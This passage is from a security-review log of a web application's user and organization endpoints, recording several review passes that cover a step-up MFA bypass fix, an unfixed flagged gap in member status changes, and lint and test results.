**Fix:** `update_organization_settings` now calls `ensure_stepup(db, token)` — the same conditional-step-up helper already used four times in `auth.py` for passkey/recovery-code routes that need re-verification only on some calls — whenever `settings_dict` contains `auth` or `file_storage`. Ordinary saves through this route (`modules`, `forms`, `membership_id`, `scheduling`, appearance, etc.) are unaffected and still ask for no re-verification, matching the route's own docstring claim that it "accepts the full settings body" — it now also enforces the same control the narrow equivalent of that claim already does. Confirmed no legitimate caller is broken: the frontend (`userServices.ts`) only ever submits `auth`/`file_storage` through the dedicated routes, never through the generic one.

**Guard tests:** `backend/tests/test_mfa_policy.py::TestGenericSettingsStepUp` (4 cases) — submitting `auth` or `file_storage` through the generic endpoint without a fresh step-up is refused with 403; submitting either with a fresh step-up succeeds; submitting neither (e.g. `forms`) never calls `ensure_stepup` at all. Deliberately calls the endpoint function directly (as `TestEndpointsPassTheAdministratorFlag` in `test_gmail_service_account_settings.py` already does for the sibling email-settings route) rather than building a full HTTP app, and relies on the file's own `@pytest.mark.real_stepup` module marker so the autouse "treat every session as fresh" fixture doesn't mask the behavior under test. This handler intentionally does **not** join `STEPUP_HANDLERS`/`_handlers_with_stepup()` in this same file — that AST sweep looks for `require_stepup` as an always-on `Depends` default, and this fix is deliberately conditional (an always-on dependency would ask for re-verification on every low-stakes save through this route).

**Severity reasoning:** HIGH — a complete bypass of an already-shipped security control, reachable with nothing beyond the stolen session the control exists to blunt, on two of the most consequential settings an organization has (identity provider, file storage).

### Guard tests added (pass 13)

`backend/tests/test_mfa_policy.py::TestGenericSettingsStepUp` (USR-13, 4 cases, detailed above). None for USR-12 — it remains flagged, not fixed; a guard test for an unfixed, disclosed gap would freeze the gap rather than catch a regression (same reasoning pass 12's USR-11 and PERM-10/PERM-11 gave).

## Pass 12 (2026-10-25, watchdog pickup) — real delta (step-up MFA requirement, Google Drive remote storage, Member ID Cards auto-suspend wiring, DOB/emergency-contact encryption, 99-column NOT NULL sweep), 0 fixed, 1 new finding (USR-11, MED, flagged)

**Step 0.** `search_pull_requests` for `is:pr is:open head:claude/security-review-` returned 0 matches — no security-review PR open. PR #3691 (Feature 06, Elections & ballots, pass 12) had already merged, docs-only, with no open rotation PR behind it; the dedicated review session (`session_011T1ZyyLrD5HagusgK9uDw2`) was unreachable, so this is a watchdog pickup. `PROGRESS.md`'s rotation table had row 06 at `✅` and row 07 (Users & organizations) as the first `⬜`, confirmed against the task's own instruction before branching.

**Scope:** the same twelve files prior passes declared: `endpoints/users.py`, `endpoints/organizations.py`, `endpoints/member_status.py`, `endpoints/member_leaves.py`, `services/user_service.py`, `services/organization_service.py`, `services/member_leave_service.py`, `models/user.py`, `schemas/user.py`, `schemas/organization.py`, `app/mcp/tools/members.py`, `app/mcp/tools/organization.py`. **Baseline:** `60ac18fd` (PR #3569's merge, pass 11). **Head:** `origin/main` at review time (`9f02e420`). `git diff --stat 60ac18fd..origin/main` across the twelve: `member_status.py` +25, `organizations.py` +164/-?, `users.py` +8, `models/user.py` +22, `schemas/organization.py` +77, `organization_service.py` +2/-1 — 235 insertions / 63 deletions across six files (`member_leaves.py`, `user_service.py`, `member_leave_service.py`, `schemas/user.py`, the two MCP files are byte-identical to pass 11). `git log --no-merges 60ac18fd..origin/main -- <declared files>` narrows this to **6 commits touching a declared file directly**; every one read in full via `git show`, not sampled.

**Not a zero-delta pass — real feature work, including one security-hardening commit that lands a real gap in this feature's own file:**

- **`8b0ba129` (require MFA/step-up re-verification of privileged members before sensitive actions) reviewed end to end against this feature's files; closes a real gap on `delete_user` and `admin_reset_password`/`admin_reset_mfa`, but leaves two structurally identical sibling mutations in the same file set uncovered (USR-11, below).** `assign_user_roles`/`add_role_to_user`/`remove_role_from_user`, `delete_user`, `admin_reset_password`, `admin_reset_mfa` and `anonymize_member` (`users.py`) and `update_file_storage_settings`/`update_auth_settings` (`organizations.py`) all gained `_stepup: User = Depends(require_stepup)`, verified present at each call site and ordered after the route's own permission dependency (`require_stepup`'s own docstring: "Add it as a parameter AFTER the route's permission dependency, so a caller who lacks the permission is told that rather than asked to re-verify" — confirmed true for all nine). `require_stepup` (`dependencies.py:463-487`) reads a per-**session** `stepup_verified_at` stamp written only by `POST /auth/step-up`, checked against `STEPUP_WINDOW_MINUTES` (10) — server-side, so a step-up on one device never unlocks another. The frontend's retry is fully generic (`isStepUpRequired`/`requestStepUp` in `utils/stepUp.ts`, wired into both axios instances' response interceptors): any 403 carrying `AUTH_STEPUP_REQUIRED` opens the re-verification modal and retries the original request, so gating a new handler needs no frontend change. `STEPUP_HANDLERS` in `backend/tests/test_mfa_policy.py` is an AST-checked, exact-set-equality-pinned list (`test_step_up_is_on_exactly_the_documented_handlers`) — confirmed it lists precisely the nine call sites above for this feature's files, no more, no fewer. **But `member_status.py`'s `change_member_status` (`:313`) and `archive_member` (`:950`) — both bound by the identical `_enforce_account_reset_ceiling` call `delete_user` uses, added together with it in pass 11's own `5fc2c5f9`/`f2732e7b` as three equally privilege-ceiling-sensitive mutations — did not gain `require_stepup`, and are not in `STEPUP_HANDLERS`.** This is a new finding (USR-11), not a re-derivation of PERM-10/PERM-11 (which this same pass found the identical gap shape in `users.py`'s rank-granting paths and `operational_ranks.py`'s rank CRUD): those reviews ran before Feature 07's own files were in scope for this lap, so neither could have seen this pair.
- **`0cbddbb3` + `fd2c8e03` (remote-storage platform interface, then Google Drive as a second platform) reviewed in `organizations.py`/`schemas/organization.py`; sound.** The two new generic routes (`POST /settings/file-storage/activate`, `POST /settings/file-storage/deactivate`, replacing the S3-only pair which stay as aliases) derive `organization_id` only from `current_user` (unchanged XC-3), and `activate_file_storage` keeps the pre-existing rate limit (`_rate_limit_settings_test_storage`). `FileStorageStatusResponse.location` (new) is documented "never a secret" — traced to `GoogleDriveConfig.describe()` (`google_drive_storage.py:137-146`), which returns only `shared_drive_id`, `folder_id`, and the service account's `client_email` (derived, not the private key); `S3Config.describe()` likewise never includes `s3_secret_access_key`. The activation record's `fingerprint` (an HMAC, not a secret itself, but excluded anyway) is explicitly filtered out of `location` at `organizations.py`'s `_file_storage_status`. The generic settings-injection guard pass 11 praised (`organization_service.py:446-450`, stripping `FILE_STORAGE_ACTIVATION_KEY` from the bare `PATCH /settings` path) is keyed on the platform-neutral `file_storage_activation` settings key — confirmed it was never S3-specific, so it already covers the Google Drive activation record with no change needed. `google_drive_service_account_key` (new secret field) is in `_FILE_STORAGE_SECRET_FIELDS` and redacted by `FileStorageSettings.redacted()` — checked directly, not inferred.
- **`f2f821e3` (Member ID Cards admin page) wires `sync_cards_with_member_status` into `change_member_status`/`undo_member_drop`/`archive_member` (`member_status.py`); reviewed, sound, and outside this feature's declared scope beyond the call sites.** `nfc_card_status_sync.py` (Feature 13's own territory) filters every query on both `organization_id` and `user_id` (`:84-90`), runs in the caller's existing transaction (no separate commit), and only cards it itself auto-suspended (`auto_suspended = True`) are ever auto-restored — an officer's own suspension is untouched. Spot-checked only, per pass 11's precedent for reviewing a call site into another feature's service file.
- **`107b09c2` (encrypt `date_of_birth`/`emergency_contacts` at rest) reviewed in `models/user.py`; sound, closes a real gap.** `User.date_of_birth` moves from plain `Date` to `EncryptedDate`, `User.emergency_contacts` from plain `JSON` to `EncryptedJSON` (AES-256-GCM). Checked that no file in this feature's scope filters or sorts on either column in SQL (`grep -n "date_of_birth" users.py member_status.py user_service.py organization_service.py`: 3 hits, all plain Python field reads/writes, e.g. the anonymize-member PII scrub nulling it — no `.where()`/`.order_by()` use). The migration (`3f2593e8071e`) is idempotent (re-running skips already-ciphertext values), refuses to encrypt without `ENCRYPTION_KEY`, and its downgrade decrypts — read in full, not taken on the commit message's word.
- **`609e04d2` (99 columns NOT NULL, as upgraded databases already are) touches `models/user.py`'s `status` column only (`nullable=True`→`False`, `server_default="active"`); no query or permission logic changed.** The accompanying migration (`6dce1364ff7e`, reviewed in an earlier pass's scope and re-confirmed unconditional here) backfills before tightening and skips a `create_all`-only table — Pitfall #35/#26 compliant, re-verified via `validate_migrations.py --strict` below.

**All 84 routes across the four principal files re-enumerated by AST, not sampled** (32 `users.py` / **29** `organizations.py`, up from 27 for the 2 new generic storage routes / 16 `member_status.py`, unchanged / 7 `member_leaves.py`, unchanged). Every route carries an auth-looking dependency (`get_current_user`, `require_permission`, `PermissionChecker`/`AllPermissionChecker`, or `require_stepup` layered on one of those) — the one apparent miss (`member_leaves.py`'s `create_leave_of_absence`) uses `require_all_permissions(...)`, a factory name outside the AST scan's checked-name list, manually confirmed gated. No new by-id route appeared without an org-scoped fetch; `organizations.py` still carries no by-id path parameter beyond the pre-existing allowlisted `/retention-policy/{record_class}`. No new `.ilike()`/`.like()` without `escape=`, raw `csv.writer`, or `window.confirm`/`alert`/`prompt` in any of the twelve backend files or the one frontend file this delta touched (`StorageLocationPanel.tsx` — grepped fresh, 0 hits on all three classes).

**Re-verified, not re-derived — both standing findings unchanged, neither touched by this window's delta:**

- **USR-5** (LOW/MED, unbounded lists; narrowed by the owner, partially fixed, remainder accepted) — `get_archived_members`, `list_users_with_roles`, `MemberLeaveService.list_leaves` are all in files this window's diff did not touch (`member_leaves.py`, `user_service.py`, `member_leave_service.py` are byte-identical to pass 11). Unchanged in shape; still accepted-as-is per the owner's recorded decision.
- **USR-8** (MED, `GET /users` sends the full roster record to every `members.view` holder; narrowed by the owner via `GET /users/directory`, remainder accepted) — `UserService.get_users_for_organization`, `UserListResponse`, `list_users` are all unchanged this window (`user_service.py` untouched; `users.py` grew only inside the step-up/stepup-dependency lines, not inside this region). Still open per the owner's decision, unchanged.

## Findings

### USR-11 — MED — The step-up gate added to `delete_user` does not extend to the two sibling member-status mutations bound by the identical privilege-ceiling check in the same file — FLAGGED (not fixed)

**What:** `8b0ba129` added `require_stepup` to `users.py`'s `delete_user` — one of three handlers pass 11's own `5fc2c5f9`/`f2732e7b` extended with `_enforce_account_reset_ceiling` as equally privilege-ceiling-sensitive ("a member manager could deactivate, status-change, or permanently delete the System Owner or any other account holding permissions beyond their own"). The other two, `member_status.py`'s `change_member_status` (`:313-319`, ceiling call at `:369`) and `archive_member` (`:950-955`, ceiling call at `:979`), did not gain `require_stepup` and are absent from `STEPUP_HANDLERS` (`backend/tests/test_mfa_policy.py:358-387`).

**Where:** `backend/app/api/v1/endpoints/member_status.py:313-319` (`change_member_status`), `:950-955` (`archive_member`); compare `backend/app/api/v1/endpoints/users.py:2262-2270` (`delete_user`, which has the gate).

**Failure scenario:** an attacker who has obtained a member's **live session** holding `members.manage` (the same stolen-cookie/unattended-device precondition `AUTH-23`, `PERM-10` and `PERM-11` all name) is asked to re-verify (authenticator code or password) before soft- or hard-deleting a member via `DELETE /users/{id}` — but can reach an equally destructive outcome on the identical target population with no re-verification at all, by instead calling `PATCH /{user_id}/status` (set the target to `suspended`/`dropped_involuntary`, immediately ending their access and, per `f2f821e3`'s new wiring, auto-suspending their NFC ID cards) or `POST /{user_id}/archive` (archive them outright). Both remain bounded by `_enforce_account_reset_ceiling`, so the attacker cannot act on an account more privileged than the stolen session's own level — this is not an escalation beyond what the session already grants, only a bypass of the re-verification step the same commit decided this class of action needs.

**Impact:** MED — same bound as the three sibling findings this exact pass's rotation already opened for the identical mechanism (`AUTH-23`, `PERM-10`, `PERM-11`): a stolen-session attacker gets one of the three "destructive member action" outcomes the commit's own description names, without the friction the other one gets.

**Why flagged, not fixed:** identical reasoning to `PERM-10`/`PERM-11` — `STEPUP_HANDLERS` is Feature 01's own pinned, AST-checked set (`test_step_up_is_on_exactly_the_documented_handlers` asserts exact-set equality), so adding either handler to it is a deliberate behavior change (every caller of `change_member_status`/`archive_member` now faces a re-verification prompt) that belongs to the step-up mechanism's owner, not a mechanical fix inside this review. Unlike `PERM-10`'s two call sites, neither `change_member_status` nor `archive_member` mixes a sensitive branch with high-frequency routine traffic — both are already officer-only, low-frequency actions — so if the owner extends the gate, this is the cheaper of the two pending items to act on (`PERM-11`'s own note makes the same distinction for rank CRUD).

**Fix:** not applied. Mirrored into `docs/KNOWN_LIMITATIONS.md`.

**Severity reasoning:** MED — same precondition and reasoning as `AUTH-23`/`PERM-10`/`PERM-11`: the same control gap applied to a third pair of call sites, not a distinct vulnerability class or a privilege-ceiling bypass.

**0 application-code defects fixed this pass** — the one new finding is flagged for an owner decision, consistent with the disposition this same rotation lap already gave the identical mechanism's two other gaps (`AUTH-23`, `PERM-10`/`PERM-11`).

### Guard tests added (pass 12)

None. USR-11 is flagged, not fixed — a guard test for an unfixed, disclosed gap would freeze the gap rather than catch a regression (same reasoning `SEC12-1` and `PERM-10`/`PERM-11` gave this same day).

### Completion gate (pass 12)

| Check                                                                                                                                                                                                                                         | Result                                                      |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| `flake8 app/ tests/ alembic/` (CI-pinned 7.4.1, installed fresh this pass)                                                                                                                                                                    | ✅ 0 violations                                             |
| `black --check app/ tests/ alembic/` (CI-pinned 26.10.1)                                                                                                                                                                                      | ✅ 2644 files unchanged                                     |
| `isort --check-only app/ tests/ alembic/` (CI-pinned 9.0.2)                                                                                                                                                                                   | ✅ clean                                                    |
| `python3 scripts/validate_migrations.py --strict`                                                                                                                                                                                             | ✅ 652 revisions, single head `3f2593e8071e`                |
| `python3 scripts/check_route_permissions.py --strict` (repo root)                                                                                                                                                                             | ✅ 276 routes, 0 errors, 0 warnings                         |
| `pytest tests/ -q -k "user or organization or member_status or member_leave or account_status or mfa_policy or step_up or stepup or file_storage or google_drive or remote_storage or nfc or not_null or explicit_null or live_schema_drift"` | ✅ 1,404 passed, 1 pre-existing skip (`py_vapid`), 0 failed |
| `cd frontend && npm run typecheck`                                                                                                                                                                                                            | ✅ 0 errors                                                 |
| `cd frontend && npm run lint`                                                                                                                                                                                                                 | ✅ 0 errors, 0 warnings                                     |

No source file needed a fix this pass — only this findings file, `PROGRESS.md`, and `KNOWN_LIMITATIONS.md` were updated. `flake8`/`black`/`isort` were not pre-installed in this sandbox and were installed fresh at CI's pinned versions (`.github/workflows/ci.yml`'s "Backend Lint" job) rather than skipped, per CLAUDE.md's own warning that `isort` in particular is the one that silently passes as "unavailable" instead of being checked.

---

## Pass 11 (2026-10-22) — real delta (privilege ceiling extended to status-change/archive/delete, permanent-delete record preservation, membership-type/account-status sync, directory-account creation, S3 file storage settings endpoints), 0 fixed, 0 new findings

**Step 0.** `search_pull_requests` for `is:pr is:open head:claude/security-review-` returned 0 — no security-review PR open. `PROGRESS.md`'s rotation table had row 07 as the first `⬜`, matching the task's own confirmation.

**Scope:** the same twelve files prior passes declared: `endpoints/users.py`, `endpoints/organizations.py`, `endpoints/member_status.py`, `endpoints/member_leaves.py`, `services/user_service.py`, `services/organization_service.py`, `services/member_leave_service.py`, `models/user.py`, `schemas/user.py`, `schemas/organization.py`, `app/mcp/tools/members.py`, `app/mcp/tools/organization.py`. **Baseline:** `cf2242e4` (PR #3410's merge, pass 10). **Head:** `origin/main` at review time. `git log --no-merges cf2242e4..origin/main -- <declared files>` narrows a large multi-day window down to **14 commits touching a declared file directly**; every one read in full via `git show`, not sampled. `git diff --stat` across the twelve: `member_status.py` +136/-? , `organizations.py` +120, `users.py` +311, `models/user.py` +114, `schemas/organization.py` +47, `schemas/user.py` +50, `organization_service.py` +14/-? — 733 insertions / 59 deletions total across the seven files actually touched (`member_leaves.py`, `user_service.py`, `member_leave_service.py`, the two MCP files are byte-identical to pass 10).

**Not a zero-delta pass — real feature work, and two of the eleven commits are themselves security hardenings landed independently of this rotation, re-verified end to end below rather than taken on their commit messages' word:**

- **`5fc2c5f9` and `f2732e7b` close a real privilege-ceiling gap.** `DELETE /users/{id}` (soft and hard), `PATCH /{user_id}/status`, and `POST /{user_id}/archive` previously checked only `members.manage`, so a member manager could deactivate, status-change, or permanently delete the System Owner or any other account holding permissions beyond their own — the same escalation shape the already-existing password-reset/MFA-reset ceiling guards against, just not extended to these three mutations. All three now call `_enforce_account_reset_ceiling` (generalized this pass with an `action`/`detail` override) before mutating: `delete_user` (`users.py:2278-2286`, after the org-scoped fetch, before any blocker check), `change_member_status` (`member_status.py:363-372`, after the locking org-scoped fetch, before any status-transition logic), and `archive_member` (`member_status.py:936-943`, after an org-scoped fetch now eager-loading `selectinload(User.positions)` so the ceiling check has what it needs without a lazy load in an async context). Confirmed `User.roles = synonym("positions")` (`models/user.py:638`) so `change_member_status`'s pre-existing `selectinload(User.roles)` already populates what `_collect_user_permissions` reads (`user.positions`) — no lazy-load gap on that path. Wildcard administrators are exempt by the existing `_has_permission` mechanism, unchanged. Each site passes a distinct `action`/`detail` (`member-delete`, `member-status-change`, `member-archive`) so `report_privilege_escalation_attempt`'s audit trail still distinguishes which mutation was attempted. Guarded by the authors' own new `tests/test_member_status_privilege_ceiling.py` (`TestStatusChange`, `TestArchive`) plus `test_users_delete_endpoint.py`'s extensions — re-read, not re-written.
- **`78a6a57e` fixes a real data-loss bug on permanent delete, correctly.** `skill_tests.examiner_id` and `shift_completion_reports.officer_id` were `NOT NULL` + `ON DELETE CASCADE` to `users.id`, so permanently deleting an examiner or officer silently destroyed every skill test or shift report they had _filed on other members_ — their own history, not the deleter's. Migration `cbe0de50f202` makes both columns `nullable=True` with `ON DELETE SET NULL` (CLAUDE.md Pitfall #2 — both model columns at `skills_testing.py:242-246` / `training.py:2376-2380` are correctly paired `nullable=True`); the migration itself derives the FK's current action from `information_schema` rather than assuming, is idempotent, and tolerates a `create_all`-only table (Pitfall #26). `get_deletion_impact`'s record counts (`users.py:2740-2777`) gained an explicit `organization_id` filter on top of the pre-existing org-scoped target-user fetch — hardening, not a fix for a real IDOR, since `user_id` was already resolved within the caller's org at `users.py:2725-2728` before any of these counts run. `return_member_inventory` (`user_deletion_service.py:287-390`) and `release_future_shift_commitments` (`member_shift_release_service.py`, new) are both read in full: every query filters `organization_id` explicitly (never trusts the bare `user_id` match alone), the shift-release path takes a locking read on `StandingShiftClaim` before ending claims (Pitfall #27), and `count_records_removed_with_member` (`user_deletion_service.py:222-268`) derives its `UNION ALL` branches from `Base.metadata`'s own `ON DELETE CASCADE` declarations plus an `organization_id` filter on every table that carries the column — "org-scoped twice over" per its own docstring, confirmed by reading the function rather than trusting it.
- **`37bf5845` (membership-type-drives-account-status sync) reviewed for privilege-ceiling bypass; found not applicable.** The new flush-listener (`sync_account_status_with_membership`, `models/user.py`) auto-moves an account only between `ACTIVE` and `PROBATIONARY` — never into/out of `leave`/`suspended`/`retired`/`dropped`/`archived` — and `UserStatus.PROBATIONARY` is itself a current-member status (Pitfall #32: `ACTIVE_ACCOUNT_STATUSES` includes it), so this sync does not "take an account out of service" the way the three mutations above do, and does not route around the ceiling check just added to them. The write that can trigger it (`PATCH /{user_id}/membership-type`, `members.manage`-gated) is a tier/classification change, not an account-lifecycle one; it was not extended with the same ceiling check and is not flagged for one — moving someone onto or off probation grants no permission and disables no account. Migration `2794794bda6e` (the backfill) re-read: conditional `UPDATE ... WHERE status = :expected` (so a status an officer changed concurrently is never clobbered), audits every row it changes, tolerates a `create_all`-only `users`/`audit_logs` pair, and its downgrade restores only rows still holding the status it wrote. No security defect.
- **`55efca00` (directory-account creation on `POST /users`) reviewed end to end; sound.** `_department_email_for_directory_account` (`users.py:266-306`) refuses before anything is written when no directory is connected, department addresses are off, or the typed address is already on the department domain — all three branches read directly, not inferred from the docstring. Every `DirectoryAccountService` call from `create_member` passes `str(current_user.organization_id)` explicitly, and the service's own methods (`connected_provider`, `stage_for_transfer`, `get_for_user`, `link_new_member`) filter `organization_id` on every query (spot-checked by reading the service file directly — not this feature's own declared scope, but load-bearing for a declared endpoint). The temporary password is never returned in the API response (unchanged invariant); the one new PII-adjacent surface, `MemberDirectoryAccountSummary.last_error` (`schemas/user.py`), is sourced from `DirectoryError`, whose docstring states "a failure whose message is safe to show an officer," and tracing its only producer (`google_workspace_service.py`'s `_translate`) confirms every branch returns a hand-authored, status-code-keyed message — "only the type and HTTP status are logged," per its own comment — never the raw provider exception body.
- **`b51300c7` (S3/MinIO file storage, 3 new routes on `organizations.py`) reviewed; sound, and correctly reuses the established settings-injection guard.** `GET /settings/file-storage/status`, `POST .../s3/activate`, `POST .../s3/deactivate` (`organizations.py:643-739`) are all gated `require_permission("settings.manage", "organization.update_settings")`, derive `organization_id` only from `current_user`, and the activate route is rate-limited (`_rate_limit_settings_test_storage`, 60s window) and audited. `OrganizationService.update_organization_settings`'s existing "the generic settings path cannot be used to plant a client-controlled `email_link_domain`" filter (praised in pass 7) is extended in the same commit to also strip the S3 activation-record key (`organization_service.py:440-448`) — so a `settings.manage` holder cannot forge a passed connection test through the generic PATCH path, only through the dedicated, rate-limited, audited route that actually ran one. The endpoint-safety check for a client-supplied S3 endpoint URL (`s3_storage.py:170-194`) routes through the repo's existing `assert_outbound_url_safe` SSRF guard and blocks cloud-metadata hosts by name, with private/plain-HTTP endpoints refused unless the operator sets `S3_ALLOW_PRIVATE_ENDPOINT` — read directly, though `s3_storage.py` is outside this feature's four declared files (it belongs to a storage/infrastructure feature not yet in the rotation) and was not audited beyond this endpoint-safety spot check. `s3_problem`/error text surfaced in the status response is sourced from hand-authored `ValueError` messages in `s3_storage.check_config`, never a raw boto3 exception.
- **`2aa75b8f` (rank-mirroring positions, additive `mirrors_rank` field) and `3050599d` (kiosk-session model column, `sessions.is_kiosk`)** are both additive, change no permission or query, and were read for completeness only because they touch `models/user.py`/`schemas/user.py`. Neither is this feature's own territory (role/position display, and Feature 01's auth/session lifecycle, respectively); no finding.
- **`74638250`, `911a111d`, `6e8b82ac`** touch only `schemas/organization.py`, adding `ge`/`le` bounds to one existing field and new `Optional[...]` fields to the shared `MinutesSettingsUpdate` sub-schema (Minutes/Feature 24's own surface riding the shared `OrganizationSettingsUpdate` aggregator) — the same pattern pass 10 already documented for this file. No logic in `organizations.py`/`organization_service.py` touched by these three.
- **`0d571c1e`, `a2ab74a4`, `8a57d069`** are date/eligibility-calculation corrections inside `member_status.py` with no change to auth, permission, org-scoping, or query shape — re-read to confirm none introduces a new by-id query or widens a permission; none does.

**All 82 routes across the four principal files re-enumerated mechanically, not sampled** (32 `users.py` / **27** `organizations.py`, up from 24 for the three new S3 routes / 16 `member_status.py` / 7 `member_leaves.py`, unchanged). Every route's `Depends` read directly: no route lost a permission dependency, no new by-id route appeared without an org-scoped fetch, and `organizations.py` still carries no by-id path parameter beyond the pre-existing allowlisted `/retention-policy/{record_class}` (the new S3 routes take no path parameters at all). No new `.ilike()`/`.like()` without `escape=`, raw `csv.writer`, or `window.confirm`/`alert`/`prompt` in any of the twelve backend files or their frontend consumers (`AddMember.tsx`, `MemberProfilePage.tsx`, `Members.tsx`, `StorageLocationPanel.tsx` — grepped fresh this pass, 0 hits; the new photo-removal confirmation in `MemberProfilePage.tsx` uses `useConfirm()`, and the status-change dialog uses `useDialog()` with `aria-modal`, matching Pitfalls #16/#21/#31).

**Re-verified, not re-derived — both standing findings unchanged, neither touched by this window's delta:**

- **USR-5** (LOW/MED, unbounded lists; narrowed by the owner, partially fixed, remainder accepted) — `get_archived_members`, `list_users_with_roles`, `MemberLeaveService.list_leaves` are all in files this window's diff did not touch (`member_leaves.py`, `user_service.py`, `member_leave_service.py` are byte-identical to pass 10; `users.py` grew above and below `list_users_with_roles` without touching it). Unchanged in shape; still accepted-as-is per the owner's recorded decision.
- **USR-8** (MED, `GET /users` sends the full roster record to every `members.view` holder; narrowed by the owner via `GET /users/directory`, remainder accepted) — `UserService.get_users_for_organization`, `UserListResponse`, `list_users` are all unchanged this window (`user_service.py` untouched; `users.py`'s `list_users`/`UserListResponse` region not part of this window's diff). Still open per the owner's decision, unchanged.

**0 application-code defects found, 0 fixes needed, 0 new findings.** This was a real, substantial delta — 733 insertions across seven files, including two genuine security hardenings (privilege-ceiling extension, permanent-delete data-loss fix) that landed independently of this rotation — and every new surface it introduced was reviewed against all seven checklist dimensions and found either already correctly guarded or not applicable to this feature's trust boundary.

### Completion gate (pass 11)

| Check                                                                                                                                                   | Result                                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| `flake8 app/ tests/ alembic/`                                                                                                                           | ✅ 0 violations                                             |
| `black --check app/ tests/ alembic/`                                                                                                                    | ✅ 2567 files unchanged                                     |
| `isort --check-only app/ tests/ alembic/` (checked against both the repo's installed 9.0.2 and CI's separately-pinned 9.0.1)                            | ✅ clean under both                                         |
| `python3 scripts/validate_migrations.py --strict`                                                                                                       | ✅ 640 revisions, single head `cc8c16cb6d98`                |
| `python3 scripts/check_route_permissions.py --strict` (repo root)                                                                                       | ✅ 273 routes, 0 errors, 0 warnings                         |
| `pytest tests/ -q -k "<pass 10's selection, plus account_status, membership_status, shift_release, kiosk, file_storage, numeric_bounds, mirrors_rank>"` | ✅ 2,396 passed, 1 pre-existing skip (`py_vapid`), 0 failed |
| `cd frontend && npm run typecheck`                                                                                                                      | ✅ 0 errors                                                 |
| `cd frontend && npm run lint`                                                                                                                           | ✅ 0 errors, 0 warnings (see note below)                    |

`npm ci` was not needed — `node_modules` was already present and current in this worktree.

---

## Pass 10 (2026-10-18) — watchdog pickup: real delta (PHI read auditing, new status-change-reason endpoints, undo-drop window + separation-date hardening), 0 fixed, 0 new findings

**Scope.** Pass 9 merged as `7add73bc4` (PR #3250). `git log --no-merges
7add73bc4..HEAD` over the twelve declared files (`endpoints/users.py`,
`endpoints/organizations.py`, `endpoints/member_status.py`,
`endpoints/member_leaves.py`, `services/user_service.py`,
`services/organization_service.py`, `services/member_leave_service.py`,
`models/user.py`, `schemas/user.py`, `schemas/organization.py`,
`mcp/tools/members.py`, `mcp/tools/organization.py`): 7 non-merge commits,
all read in full. No user/organization-table migration landed (checked by
scanning every new migration body for `users`/`organizations`/
`member_status`/`member_leave` — none matched; the new head
`89723c04ae94` and its siblings all belong to the Minutes module's own
signatures/public-copies/reminders tables).

**3 of the 7 commits only touch `schemas/organization.py`, and only to add
fields to the Minutes module's own settings sub-schema** (`public_posting`
/ `executive_library_publishing` / `executive_public_posting` on
`MinutesSettingsUpdate`, a new `SignatureSlotSetting` + `signature_slots`
field, `reminder_days_before_due` / `overdue_repeat_days` /
`open_items_digest`) — all `Optional[...] = None` with simple
Field-level constraints (regex/length/range), nested under the shared
`OrganizationSettingsUpdate` aggregator, which is why they show up in this
feature's file list despite being Minutes' (Feature 24) own surface. No
logic in `organizations.py`/`organization_service.py` touched; same shape
as pass 9's note about an unrelated file sharing this feature's declared
list.

**The 4 real changes, each verified sound:**

- **PHI read auditing (`c498e4bc1`).** `member_leaves.py` gains
  `_audit_leave_read()`, called from `list_leaves_of_absence` (every read)
  and `get_member_leaves` (only when `not is_own` — a member reading their
  own leave history isn't audited as accessing someone else's PHI). Every
  event carries ids and a record count, never the leave's free-text reason
  — satisfies HIPAA §164.312(b) without logging the PHI itself. Pure
  audit-logging addition; no auth/tenancy/exposure change.
- **New status-change-reason endpoints (`1a305b736`).** `GET
/users/{id}/status-change` and `PATCH
/users/{id}/status-change-reason` are both gated by
  `require_permission("members.manage")` and resolve the target through
  the existing `_load_member(db, user_id, organization_id, for_update=...)`
  helper — direct org-scoping (Pitfall #14a) via `User.organization_id ==
organization_id`, excluding soft-deleted rows, with `for_update=True` on
  the write path. The PATCH refuses when there's no status change on
  record to attach a reason to, strips/nulls a blank reason, and audits
  with both the previous and new reason text alongside the original
  `member_status_changed` entry. No new exposure: the reason was already
  readable by a `members.manage` holder via the member record itself.
- **Undo-drop window counts from the drop's effective date
  (`5ee95c2d4`).** Previously a back-dated drop still got the full
  `UNDO_DROP_WINDOW_DAYS` counted from _when it was recorded_, so a drop
  entered three weeks late could be silently erased from service history
  well past when a department would expect that to still be possible —
  tightening, not weakening, an existing business rule. The new anchor
  calculation is capped so it can never run _later_ than the original
  window (`anchor = changed - timedelta(days=backdated_days)` only shifts
  backward), closing the exact loophole the commit names: editing a
  stint's end afterwards in Service History to stretch the undo window.
  Both call sites (`get_undo_drop_availability`, `undo_member_drop`) are
  unchanged in their org-scoping/permission gates — only the availability
  calculation itself changed.
- **Separation-date on status change (`0929c7fea`).** `change_member_status`
  (existing endpoint, existing `members.manage`-gated route, unchanged
  this commit) now accepts an optional `separation_date`, validated
  server-side against `today` (`resolve_org_today`, not client time) and
  refused with 400 if in the future; a date before the member's current
  service began is refused via the service layer's own `ValueError` → 400. `status_changed_at` (audit/undo-window anchor) is left alone;
  only the service-stint close date moves. No new permission surface.

**All 79 routes across the four principal files re-enumerated mechanically**
(32/24/16/7 — `member_status.py` grew from 14 to 16 for the two new
status-change-reason routes above; the other three files are unchanged
counts from pass 9). No route re-gated, no `.ilike()`/`.like()` without
`escape=`, no raw `csv.writer`, no `window.confirm`/`alert`/`prompt`
introduced this window (grepped the four substantive commits directly).

**Standing items re-verified, both unchanged (neither file in this
window's delta):**

- **USR-5** (unbounded lists, narrowed/accepted by the owner) —
  `get_archived_members` (now `member_status.py:1012`, line drift only
  from this window's own insertions landing above it),
  `list_users_with_roles` (`users.py:870`, file untouched this window),
  `MemberLeaveService.list_leaves` (`member_leave_service.py:160`, file
  untouched this window) all unchanged in shape.
- **USR-8** (`GET /users` sends the full roster record to every
  `members.view` holder, narrowed/accepted by the owner) — `users.py` and
  `UserListResponse` untouched this window.

**0 application-code defects found, 0 fixes needed, 0 new findings.**

### Completion gate (pass 10)

| Check                                                             | Result                                                                                                                                                                                                                                                                                                                                                                         |
| ----------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `flake8 app/ tests/ alembic/`                                     | ✅ 0 violations                                                                                                                                                                                                                                                                                                                                                                |
